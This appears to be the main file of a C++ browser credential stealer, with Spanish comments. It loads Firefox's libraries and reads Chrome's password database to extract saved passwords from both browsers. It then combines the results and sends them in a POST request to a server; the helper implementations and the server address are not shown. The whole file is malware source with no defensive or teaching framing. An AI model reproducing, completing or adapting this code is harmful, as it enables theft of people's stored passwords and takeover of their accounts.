#include <string>
#include <iostream>

#include "Firefox.h"
#include "chrome.h"
#include "Recursos.h"

using namespace std;


void main(){
	Recursos recursos;

	//cout << " ------------------------- Mozilla Firefox ------------------------- " << endl;
	Firefox firefox;
	char *path = firefox.rutaInstalado();
	char *info_firefox;
	if (firefox.cargarFunciones(path)){
		//std::cout << "loadFunctions(path)" << endl;
		info_firefox = firefox.getContraseñas();
		free(path);
	} else {
		//std::cout << "Firefox no esta instalado" << std::endl;
		info_firefox = "Firefox no esta instalado";
	}
	
	//cout << " ------------------------- Google Chrome ------------------------- " << endl;
	Chrome chrome;
	char* rutaBD = chrome.getRutaBD(); 
	char* info_chrome = chrome.getContraseñas(rutaBD);

	char* info = recursos.dupcat(info_firefox, info_chrome, 0);
	recursos.enviarPost(info); // enciar post a servidor con la información sacada de firefox y chrome
	

}